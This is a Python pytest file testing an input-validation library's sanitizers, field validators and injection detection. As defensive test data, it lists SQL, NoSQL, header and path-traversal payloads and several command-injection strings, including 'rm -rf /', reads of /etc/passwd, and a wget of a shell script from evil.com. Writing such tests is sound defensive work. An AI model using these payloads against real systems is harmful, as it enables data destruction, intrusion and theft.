"""
SEC-011: Tests for Input Validation.
"""

import pytest


class TestValidationError:
    """Test ValidationError exception."""

    def test_create_error(self):
        """Should create validation error."""
        from shared.input_validation import ValidationError

        error = ValidationError(
            message="Invalid input",
            field="email",
            value="bad@",
            code="INVALID_EMAIL",
        )

        assert error.message == "Invalid input"
        assert error.field == "email"
        assert error.code == "INVALID_EMAIL"

    def test_to_dict(self):
        """Should convert to dictionary."""
        from shared.input_validation import ValidationError

        error = ValidationError(
            message="Invalid",
            field="name",
            code="INVALID",
        )

        d = error.to_dict()

        assert d["error"] == "INVALID"
        assert d["message"] == "Invalid"
        assert d["field"] == "name"


class TestInjectionAttemptError:
    """Test InjectionAttemptError exception."""

    def test_create_error(self):
        """Should create injection error."""
        from shared.input_validation import InjectionAttemptError

        error = InjectionAttemptError(
            message="SQL injection detected",
            injection_type="SQL",
            field="query",
        )

        assert error.injection_type == "SQL"
        assert error.code == "INJECTION_ATTEMPT"


class TestInjectionPatterns:
    """Test injection pattern detection."""

    def test_sql_patterns_exist(self):
        """Should have SQL injection patterns."""
        from shared.input_validation import InjectionPatterns

        assert len(InjectionPatterns.SQL_INJECTION) > 0

    def test_nosql_patterns_exist(self):
        """Should have NoSQL injection patterns."""
        from shared.input_validation import InjectionPatterns

        assert len(InjectionPatterns.NOSQL_INJECTION) > 0

    def test_command_patterns_exist(self):
        """Should have command injection patterns."""
        from shared.input_validation import InjectionPatterns

        assert len(InjectionPatterns.COMMAND_INJECTION) > 0


class TestInputSanitizer:
    """Test InputSanitizer class."""

    def test_strip_sql_chars(self):
        """Should strip SQL dangerous characters."""
        from shared.input_validation import InputSanitizer

        result = InputSanitizer.strip_sql_chars("test; DROP TABLE users--")

        assert ";" not in result
        assert "--" not in result

    def test_strip_shell_chars(self):
        """Should strip shell dangerous characters."""
        from shared.input_validation import InputSanitizer

        result = InputSanitizer.strip_shell_chars("test`rm -rf /`")

        assert "`" not in result
        assert "$" not in result

    def test_strip_html(self):
        """Should strip HTML tags."""
        from shared.input_validation import InputSanitizer

        result = InputSanitizer.strip_html("<script>alert('xss')</script>Hello")

        assert "<script>" not in result
        assert "Hello" in result

    def test_escape_sql(self):
        """Should escape SQL special chars."""
        from shared.input_validation import InputSanitizer

        result = InputSanitizer.escape_sql("O'Brien")

        assert result == "O''Brien"

    def test_normalize_unicode(self):
        """Should normalize unicode."""
        from shared.input_validation import InputSanitizer

        # Test with combining characters
        result = InputSanitizer.normalize_unicode("café")

        assert isinstance(result, str)

    def test_to_alphanumeric(self):
        """Should keep only alphanumeric."""
        from shared.input_validation import InputSanitizer

        result = InputSanitizer.to_alphanumeric("hello-world_123!", allowed="-_")

        assert result == "hello-world_123"


class TestLengthRule:
    """Test LengthRule validation."""

    def test_valid_length(self):
        """Should accept valid length."""
        from shared.input_validation import LengthRule

        rule = LengthRule(min_length=1, max_length=10)
        result = rule.validate("hello", "test")

        assert result == "hello"

    def test_too_short(self):
        """Should reject too short."""
        from shared.input_validation import LengthRule, ValidationError

        rule = LengthRule(min_length=5, max_length=10)

        with pytest.raises(ValidationError, match="too short"):
            rule.validate("hi", "test")

    def test_too_long(self):
        """Should reject too long."""
        from shared.input_validation import LengthRule, ValidationError

        rule = LengthRule(min_length=1, max_length=5)

        with pytest.raises(ValidationError, match="too long"):
            rule.validate("hello world", "test")


class TestPatternRule:
    """Test PatternRule validation."""

    def test_valid_pattern(self):
        """Should accept matching pattern."""
        from shared.input_validation import PatternRule

        rule = PatternRule(pattern=r'^[a-z]+$')
        result = rule.validate("hello", "test")

        assert result == "hello"

    def test_invalid_pattern(self):
        """Should reject non-matching."""
        from shared.input_validation import PatternRule, ValidationError

        rule = PatternRule(pattern=r'^[a-z]+$', message="Letters only")

        with pytest.raises(ValidationError, match="Letters only"):
            rule.validate("hello123", "test")


class TestInjectionRule:
    """Test InjectionRule validation."""

    def test_safe_input(self):
        """Should accept safe input."""
        from shared.input_validation import InjectionRule

        rule = InjectionRule()
        result = rule.validate("hello world", "test")

        assert result == "hello world"

    def test_detect_sql_injection(self):
        """Should detect SQL injection."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_sql=True)

        with pytest.raises(InjectionAttemptError) as exc:
            rule.validate("'; DROP TABLE users; --", "query")
        
        assert exc.value.injection_type == "SQL"

    def test_detect_sql_union(self):
        """Should detect SQL UNION injection."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_sql=True)

        with pytest.raises(InjectionAttemptError):
            rule.validate("1 UNION SELECT * FROM passwords", "id")

    def test_detect_sql_or_injection(self):
        """Should detect SQL OR injection."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_sql=True)

        with pytest.raises(InjectionAttemptError):
            rule.validate("' OR '1'='1", "password")

    def test_detect_nosql_injection(self):
        """Should detect NoSQL injection."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_nosql=True)

        with pytest.raises(InjectionAttemptError) as exc:
            rule.validate('{"$gt": ""}', "query")
        
        assert exc.value.injection_type == "NoSQL"

    def test_detect_command_injection(self):
        """Should detect command injection."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_command=True)

        with pytest.raises(InjectionAttemptError) as exc:
            rule.validate("test; rm -rf /", "filename")
        
        assert exc.value.injection_type == "Command"

    def test_detect_command_substitution(self):
        """Should detect command substitution."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_command=True)

        with pytest.raises(InjectionAttemptError):
            rule.validate("$(cat /etc/passwd)", "input")

    def test_detect_header_injection(self):
        """Should detect header injection."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_header=True)

        with pytest.raises(InjectionAttemptError) as exc:
            rule.validate("test\r\nSet-Cookie: session=evil", "header")
        
        assert exc.value.injection_type == "Header"


class TestAllowlistRule:
    """Test AllowlistRule validation."""

    def test_allowed_value(self):
        """Should accept allowed values."""
        from shared.input_validation import AllowlistRule

        rule = AllowlistRule(allowed_values={"active", "pending", "completed"})
        result = rule.validate("active", "status")

        assert result == "active"

    def test_disallowed_value(self):
        """Should reject disallowed values."""
        from shared.input_validation import AllowlistRule, ValidationError

        rule = AllowlistRule(allowed_values={"active", "pending"})

        with pytest.raises(ValidationError, match="not in allowed"):
            rule.validate("deleted", "status")

    def test_case_insensitive(self):
        """Should support case-insensitive matching."""
        from shared.input_validation import AllowlistRule

        rule = AllowlistRule(
            allowed_values={"Active", "Pending"},
            case_sensitive=False,
        )

        result = rule.validate("ACTIVE", "status")
        assert result == "ACTIVE"


class TestIdentifierField:
    """Test IdentifierField validator."""

    def test_valid_identifier(self):
        """Should accept valid identifiers."""
        from shared.input_validation import IdentifierField

        validator = IdentifierField()

        assert validator.validate("user123", "id") == "user123"
        assert validator.validate("my-slug", "slug") == "my-slug"
        assert validator.validate("test_name", "name") == "test_name"

    def test_valid_uuid(self):
        """Should accept UUIDs."""
        from shared.input_validation import IdentifierField

        validator = IdentifierField(allow_uuid=True)

        result = validator.validate("550e8400-e29b-41d4-a716-446655440000", "id")
        assert result == "550e8400-e29b-41d4-a716-446655440000"

    def test_invalid_identifier(self):
        """Should reject invalid identifiers."""
        from shared.input_validation import IdentifierField, ValidationError

        validator = IdentifierField()

        with pytest.raises(ValidationError):
            validator.validate("user@123", "id")

    def test_injection_in_identifier(self):
        """Should detect injection in identifiers."""
        from shared.input_validation import IdentifierField, InjectionAttemptError, ValidationError

        validator = IdentifierField()

        with pytest.raises((ValidationError, InjectionAttemptError)):
            validator.validate("user'; DROP TABLE users--", "id")


class TestEmailField:
    """Test EmailField validator."""

    def test_valid_email(self):
        """Should accept valid emails."""
        from shared.input_validation import EmailField

        validator = EmailField()

        assert validator.validate("user@example.com", "email") == "user@example.com"
        assert validator.validate("user.name+tag@sub.domain.com", "email")

    def test_invalid_email(self):
        """Should reject invalid emails."""
        from shared.input_validation import EmailField, ValidationError

        validator = EmailField()

        with pytest.raises(ValidationError):
            validator.validate("not-an-email", "email")

        with pytest.raises(ValidationError):
            validator.validate("@example.com", "email")


class TestURLField:
    """Test URLField validator."""

    def test_valid_url(self):
        """Should accept valid URLs."""
        from shared.input_validation import URLField

        validator = URLField()

        assert validator.validate("https://example.com", "url")
        assert validator.validate("http://sub.domain.com/path?q=1", "url")

    def test_invalid_url(self):
        """Should reject invalid URLs."""
        from shared.input_validation import URLField, ValidationError

        validator = URLField()

        with pytest.raises(ValidationError):
            validator.validate("not a url", "url")

    def test_scheme_restriction(self):
        """Should enforce allowed schemes."""
        from shared.input_validation import URLField, ValidationError

        validator = URLField(allowed_schemes={"https"})

        # HTTPS should work
        validator.validate("https://example.com", "url")

        # HTTP should fail
        with pytest.raises(ValidationError, match="scheme"):
            validator.validate("http://example.com", "url")


class TestTextContentField:
    """Test TextContentField validator."""

    def test_valid_text(self):
        """Should accept valid text."""
        from shared.input_validation import TextContentField

        validator = TextContentField()

        result = validator.validate("Hello, world!", "content")
        assert result == "Hello, world!"

    def test_strip_html(self):
        """Should strip HTML by default."""
        from shared.input_validation import TextContentField

        validator = TextContentField(allow_html=False)

        result = validator.validate("<b>Bold</b> text", "content")
        assert "<b>" not in result
        assert "Bold" in result

    def test_allow_html(self):
        """Should allow HTML when enabled."""
        from shared.input_validation import TextContentField

        validator = TextContentField(allow_html=True)

        result = validator.validate("<b>Bold</b>", "content")
        assert "<b>" in result


class TestIntegerField:
    """Test IntegerField validator."""

    def test_valid_integer(self):
        """Should accept valid integers."""
        from shared.input_validation import IntegerField

        validator = IntegerField()

        assert validator.validate(42, "count") == 42
        assert validator.validate("123", "count") == 123

    def test_min_value(self):
        """Should enforce minimum."""
        from shared.input_validation import IntegerField, ValidationError

        validator = IntegerField(min_value=10)

        with pytest.raises(ValidationError, match="at least"):
            validator.validate(5, "count")

    def test_max_value(self):
        """Should enforce maximum."""
        from shared.input_validation import IntegerField, ValidationError

        validator = IntegerField(max_value=100)

        with pytest.raises(ValidationError, match="at most"):
            validator.validate(150, "count")


class TestEnumField:
    """Test EnumField validator."""

    def test_valid_enum(self):
        """Should accept allowed values."""
        from shared.input_validation import EnumField

        validator = EnumField(allowed_values={"draft", "published", "archived"})

        assert validator.validate("draft", "status") == "draft"

    def test_invalid_enum(self):
        """Should reject invalid values."""
        from shared.input_validation import EnumField, ValidationError

        validator = EnumField(allowed_values={"draft", "published"})

        with pytest.raises(ValidationError):
            validator.validate("deleted", "status")


class TestInputValidator:
    """Test InputValidator class."""

    def test_validate_identifier(self):
        """Should validate identifiers."""
        from shared.input_validation import InputValidator

        validator = InputValidator()

        assert validator.validate_identifier("user-123") == "user-123"

    def test_validate_email(self):
        """Should validate emails."""
        from shared.input_validation import InputValidator

        validator = InputValidator()

        assert validator.validate_email("test@example.com") == "test@example.com"

    def test_validate_url(self):
        """Should validate URLs."""
        from shared.input_validation import InputValidator

        validator = InputValidator()

        assert validator.validate_url("https://example.com")

    def test_check_injection(self):
        """Should check for injections."""
        from shared.input_validation import InputValidator, InjectionAttemptError

        validator = InputValidator()

        # Safe input
        validator.check_injection("hello world")

        # Dangerous input
        with pytest.raises(InjectionAttemptError):
            validator.check_injection("'; DROP TABLE users--")

    def test_sanitize_for_sql(self):
        """Should sanitize for SQL."""
        from shared.input_validation import InputValidator

        validator = InputValidator()

        result = validator.sanitize_for_sql("O'Brien")
        assert result == "O''Brien"

    def test_validate_dict(self):
        """Should validate dictionaries."""
        from shared.input_validation import (
            InputValidator,
            IdentifierField,
            EmailField,
        )

        validator = InputValidator()
        schema = {
            "id": IdentifierField(),
            "email": EmailField(),
        }

        data = {
            "id": "user-123",
            "email": "test@example.com",
        }

        result = validator.validate_dict(data, schema)

        assert result["id"] == "user-123"
        assert result["email"] == "test@example.com"

    def test_validate_dict_errors(self):
        """Should collect all errors."""
        from shared.input_validation import (
            InputValidator,
            IdentifierField,
            EmailField,
            ValidationError,
        )

        validator = InputValidator()
        schema = {
            "id": IdentifierField(),
            "email": EmailField(),
        }

        data = {
            "id": "!!!invalid!!!",
            "email": "not-email",
        }

        with pytest.raises(ValidationError) as exc:
            validator.validate_dict(data, schema)
        
        assert "MULTIPLE_VALIDATION_ERRORS" in exc.value.code


class TestValidateInputDecorator:
    """Test validate_input decorator."""

    def test_sync_function(self):
        """Should validate sync function params."""
        from shared.input_validation import validate_input, IdentifierField

        @validate_input(user_id=IdentifierField())
        def get_user(user_id: str):
            return user_id

        result = get_user(user_id="user-123")
        assert result == "user-123"

    @pytest.mark.asyncio
    async def test_async_function(self):
        """Should validate async function params."""
        from shared.input_validation import validate_input, IdentifierField

        @validate_input(user_id=IdentifierField())
        async def get_user_async(user_id: str):
            return user_id

        result = await get_user_async(user_id="user-456")
        assert result == "user-456"

    def test_validation_error_in_decorator(self):
        """Should raise validation error."""
        from shared.input_validation import validate_input, EmailField, ValidationError

        @validate_input(email=EmailField())
        def send_email(email: str):
            return email

        with pytest.raises(ValidationError):
            send_email(email="not-an-email")


class TestSecurityScenarios:
    """Test real-world security scenarios."""

    def test_sql_injection_login(self):
        """Should block SQL injection in login."""
        from shared.input_validation import InputValidator, InjectionAttemptError

        validator = InputValidator()

        # Common SQL injection attempts
        attacks = [
            "admin'--",
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1; DELETE FROM users",
            "' UNION SELECT * FROM passwords--",
        ]

        for attack in attacks:
            with pytest.raises(InjectionAttemptError):
                validator.check_injection(attack, field_name="username")

    def test_nosql_injection_mongodb(self):
        """Should block NoSQL injection."""
        from shared.input_validation import InjectionRule, InjectionAttemptError

        rule = InjectionRule(check_nosql=True)

        attacks = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "this.password == this.username"}',
        ]

        for attack in attacks:
            with pytest.raises(InjectionAttemptError):
                rule.validate(attack, "query")

    def test_command_injection_filename(self):
        """Should block command injection in filenames."""
        from shared.input_validation import InputValidator, InjectionAttemptError

        validator = InputValidator()

        attacks = [
            "file.txt; rm -rf /",
            "file.txt | cat /etc/passwd",
            "file.txt && wget http://evil.com/shell.sh",
            "$(whoami).txt",
        ]

        for attack in attacks:
            with pytest.raises(InjectionAttemptError):
                validator.check_injection(attack, field_name="filename")

    def test_path_traversal_blocked(self):
        """Should block path traversal in identifiers."""
        from shared.input_validation import IdentifierField, ValidationError

        validator = IdentifierField()

        attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
        ]

        for attack in attacks:
            with pytest.raises(ValidationError):
                validator.validate(attack, "path")
